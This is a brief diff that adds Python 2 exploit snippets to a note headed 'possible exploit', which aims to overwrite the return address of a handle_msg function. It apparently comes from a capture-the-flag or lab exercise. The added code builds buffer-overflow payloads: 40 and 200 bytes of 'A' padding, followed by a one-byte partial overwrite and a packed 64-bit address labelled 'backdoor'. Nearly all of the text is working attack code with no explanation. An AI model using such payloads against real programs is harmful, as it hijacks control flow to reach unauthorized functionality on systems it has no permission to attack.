@@ -1,2 +1,21 @@
 possible exploit 
 overwrite the return address of handle_msg function
+
+
+
+import struct
+
+padding = "A" * 40
+
+talaob = struct.pack ("B", 0xd0)
+
+print padding + talaob
+
+
+import struct
+
+padding = "A" * 200
+
+backdoor = struct.pack ("Q", 0x55555555488c)
+
+print padding + backdoor
